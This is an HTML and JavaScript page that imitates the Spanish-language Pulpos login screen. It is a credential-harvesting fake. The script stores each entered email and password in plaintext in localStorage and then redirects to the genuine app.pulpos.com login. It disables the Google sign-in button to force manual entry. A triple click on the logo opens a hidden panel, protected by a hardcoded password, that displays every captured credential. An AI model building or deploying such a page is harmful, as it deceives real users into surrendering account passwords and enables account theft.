<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Ingresa a Pulpos</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
:root{
--bg:#ffffff;
--title:#161a2c;
--text:#374151;
--muted:#9ca3af;
--placeholder:#6b7280;
--border:#d1d5db;
--btn-off-bg:#f3f4f6;
--btn-off-text:#6b7280;
--btn-on-bg:#4aa3b0;
--btn-on-text:#ffffff;
--link:#2f80b7;
--logo:#4aa3b0;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{
font-family:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
background:var(--bg);
color:var(--text);
-webkit-font-smoothing:antialiased;
position:relative;
overflow-x:hidden;
}
body::before{
content:"";
position:absolute;inset:0 0 auto 0;height:110px;
background:
radial-gradient(ellipse 22% 80% at 38% 0%, rgba(233,213,255,.45), transparent 100%),
radial-gradient(ellipse 30% 100% at 90% 0%, rgba(186,230,230,.55), transparent 100%),
radial-gradient(ellipse 25% 90% at 8% 20%, rgba(204,238,238,.45), transparent 100%);
pointer-events:none;
}
main{
position:relative;
width:min(calc(100% - 120px),380px);
margin:0 auto;
padding-top:max(127px, env(safe-area-inset-top, 0px));
text-align:center;
}
.logo{width:56px;height:auto;display:block;margin:0 auto;cursor:pointer;}
.logo img{width:100%;height:auto;display:block;}
h1{
margin-top:24px;
font-size:24px;line-height:32px;font-weight:600;color:var(--title);
letter-spacing:-.01em;
}
.google{
margin-top:48px;
width:100%;height:44px;
display:flex;align-items:center;justify-content:center;gap:12px;
background:#fff;border:1px solid var(--border);border-radius:6px;
font:500 16px/1 'Inter',sans-serif;color:var(--text);cursor:pointer;
transition:background .15s;
}
.google:hover{background:#f9fafb}
.google svg{width:18px;height:18px}
.divider{
margin:25px 0 23px;
display:flex;align-items:center;gap:22px;
color:var(--muted);font-size:14px;
}
.divider::before,.divider::after{content:"";flex:1;height:1px;background:var(--border)}
input[type=email], input[type=password]{
width:100%;height:38px;padding:0 13px;
border:1px solid var(--border);border-radius:6px;background:#fff;
font:400 14px 'Inter',sans-serif;color:var(--title);outline:none;
transition:border-color .15s, box-shadow .15s;
margin-bottom: 12px;
}
input::placeholder{color:var(--placeholder)}
input:focus{border-color:var(--logo);box-shadow:0 0 0 3px rgba(74,163,176,.2)}
.continue{
margin-top:4px;width:100%;height:44px;border:0;border-radius:6px;
background:var(--btn-off-bg);color:var(--btn-off-text);
font:500 16px/1 'Inter',sans-serif;cursor:not-allowed;
transition:background .15s,color .15s;
}
.continue:not(:disabled){background:var(--btn-on-bg);color:var(--btn-on-text);cursor:pointer}
.continue:not(:disabled):hover{filter:brightness(.95)}
.signup{margin-top:20px;font-size:13px;color:var(--placeholder)}
.signup a{color:var(--link);font-weight:500;text-decoration:none;margin-left:3px}
.signup a:hover{text-decoration:underline}
.error{margin-top:2px;margin-bottom:8px;font-size:12px;color:#dc2626;text-align:left;min-height:0}
.hidden { display: none !important; }
/* Admin Modal Styles */
#adminModal {
position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 1000;
}
.modal-content {
background: white; padding: 20px; border-radius: 8px; width: 90%; max-width: 450px; text-align: left; max-height: 85vh; overflow-y: auto;
}
.modal-content h3 { margin-bottom: 10px; color: var(--title); font-size: 18px; }
.modal-content table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
.modal-content th, .modal-content td { border: 1px solid var(--border); padding: 8px; text-align: left; }
.modal-content th { background: #f3f4f6; }
.btn-admin { padding: 6px 12px; background: var(--btn-on-bg); color: white; border: none; border-radius: 4px; cursor: pointer; margin-top: 10px; }
.btn-danger { background: #dc2626; }
</style>
</head>
<body>
<main>
<!-- Logo pulpo (Haz clic 3 veces para acceso admin) -->
<div class="logo" id="logoBtn" title="Pulpos">
<img src="image_2.png" alt="Logo Pulpos">
</div>
<h1>Ingresa a Pulpos</h1>
<button class="google" type="button" id="googleBtn">
<svg viewBox="0 0 48 48" aria-hidden="true">
<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
</svg>
Continuar con Google
</button>
<div class="divider">o sino</div>
<form id="loginForm" novalidate>
<!-- Paso 1: Correo -->
<div id="stepEmail">
<input type="email" id="email" placeholder="Ingresa tu email" autocomplete="email" inputmode="email" aria-label="Email">
<div class="error" id="errorEmail" role="alert"></div>
<button class="continue" type="button" id="nextBtn" disabled>Continuar</button>
</div>
<!-- Paso 2: Contraseña -->
<div id="stepPassword" class="hidden">
<input type="password" id="password" placeholder="Ingresa tu contraseña" aria-label="Contraseña">
<div class="error" id="errorPassword" role="alert"></div>
<button class="continue" type="submit" id="submitBtn" disabled>Iniciar sesión</button>
</div>
</form>
<p class="signup">¿No tienes una cuenta? <a href="#registro">Regístrate</a></p>
</main>
<!-- Panel de Administración Secreto (Modal) -->
<div id="adminModal" class="hidden">
<div class="modal-content">
<div id="adminLoginView">
<h3>Acceso a Administración</h3>
<p style="font-size: 13px; margin-bottom: 10px; color: var(--text);">Ingresa la contraseña para ver los correos y contraseñas guardados:</p>
<input type="password" id="adminPassInput" placeholder="Contraseña de admin">
<div class="error" id="adminError"></div>
<button class="btn-admin" id="adminLoginBtn">Entrar</button>
<button class="btn-admin btn-danger" id="closeModalBtn" style="background:#6b7280; margin-left:5px;">Cerrar</button>
</div>
<div id="adminDataView" class="hidden">
<h3>Registros Almacenados</h3>
<div id="credentialsTableContainer"></div>
<button class="btn-admin btn-danger" id="clearDataBtn">Borrar Registros</button>
<button class="btn-admin" id="closeAdminDataBtn" style="background:#6b7280; margin-left:5px;">Cerrar</button>
</div>
</div>
</div>
<script>
const stepEmail = document.getElementById('stepEmail');
const stepPassword = document.getElementById('stepPassword');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const nextBtn = document.getElementById('nextBtn');
const submitBtn = document.getElementById('submitBtn');
const errorEmail = document.getElementById('errorEmail');
const errorPassword = document.getElementById('errorPassword');
const googleBtn = document.getElementById('googleBtn');
const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
let currentEmail = '';
// Paso 1: Validación de correo
emailInput.addEventListener('input', () => {
nextBtn.disabled = !re.test(emailInput.value.trim());
errorEmail.textContent = '';
});
nextBtn.addEventListener('click', () => {
const val = emailInput.value.trim();
if (!re.test(val)) {
errorEmail.textContent = 'Ingresa un email válido.';
return;
}
currentEmail = val;
stepEmail.classList.add('hidden');
stepPassword.classList.remove('hidden');
passwordInput.focus();
});
// Paso 2: Validación de contraseña
passwordInput.addEventListener('input', () => {
submitBtn.disabled = passwordInput.value.trim().length === 0;
errorPassword.textContent = '';
});
// Envío final: guardado y redirección
document.getElementById('loginForm').addEventListener('submit', (e) => {
e.preventDefault();
const passwordVal = passwordInput.value.trim();
if (!passwordVal) {
errorPassword.textContent = 'Ingresa una contraseña.';
return;
}
// Guardar credenciales en localStorage
let creds = JSON.parse(localStorage.getItem('pulpos_creds') || '[]');
creds.push({
email: currentEmail,
password: passwordVal,
date: new Date().toLocaleString()
});
localStorage.setItem('pulpos_creds', JSON.stringify(creds));
// Redirigir a la URL solicitada
window.location.href = 'https://app.pulpos.com/login';
});
// Botón Google: mensaje de no disponibilidad
googleBtn.addEventListener('click', () => {
errorEmail.textContent = 'Por el momento no está disponible, ingresa correo y contraseña manualmente.';
});
// Acceso secreto a administración (3 clics rápidos en el logo del pulpo)
const secretLogo = document.getElementById('logoBtn');
const adminModal = document.getElementById('adminModal');
const adminLoginView = document.getElementById('adminLoginView');
const adminDataView = document.getElementById('adminDataView');
const adminPassInput = document.getElementById('adminPassInput');
const adminLoginBtn = document.getElementById('adminLoginBtn');
const adminError = document.getElementById('adminError');
const closeModalBtn = document.getElementById('closeModalBtn');
const closeAdminDataBtn = document.getElementById('closeAdminDataBtn');
const clearDataBtn = document.getElementById('clearDataBtn');
const credentialsTableContainer = document.getElementById('credentialsTableContainer');
let clickCount = 0;
let clickTimer = null;
secretLogo.addEventListener('click', () => {
clickCount++;
if (clickTimer) clearTimeout(clickTimer);
clickTimer = setTimeout(() => {
clickCount = 0;
}, 500);
if (clickCount === 3) {
clickCount = 0;
adminModal.classList.remove('hidden');
adminLoginView.classList.remove('hidden');
adminDataView.classList.add('hidden');
adminPassInput.value = '';
adminError.textContent = '';
adminPassInput.focus();
}
});
// Validar contraseña de administración ("contraseña 2024")
adminLoginBtn.addEventListener('click', () => {
if (adminPassInput.value === 'contraseña 2024') {
adminLoginView.classList.add('hidden');
adminDataView.classList.remove('hidden');
renderCredentials();
} else {
adminError.textContent = 'Contraseña incorrecta.';
}
});
adminPassInput.addEventListener('keypress', (e) => {
if (e.key === 'Enter') adminLoginBtn.click();
});
function renderCredentials() {
let creds = JSON.parse(localStorage.getItem('pulpos_creds') || '[]');
if (creds.length === 0) {
credentialsTableContainer.innerHTML = '<p style="font-size:13px; color:var(--muted); margin-top:10px;">No hay registros guardados.</p>';
return;
}
let html = `<table>
<tr><th>Fecha</th><th>Correo</th><th>Contraseña</th></tr>`;
creds.forEach(c => {
html += `<tr><td>${c.date}</td><td>${c.email}</td><td>${c.password}</td></tr>`;
});
html += `</table>`;
credentialsTableContainer.innerHTML = html;
}
clearDataBtn.addEventListener('click', () => {
if (confirm('¿Deseas borrar todos los registros?')) {
localStorage.removeItem('pulpos_creds');
renderCredentials();
}
});
closeModalBtn.addEventListener('click', () => { adminModal.classList.add('hidden'); });
closeAdminDataBtn.addEventListener('click', () => { adminModal.classList.add('hidden'); });
</script>
</body>
</html>
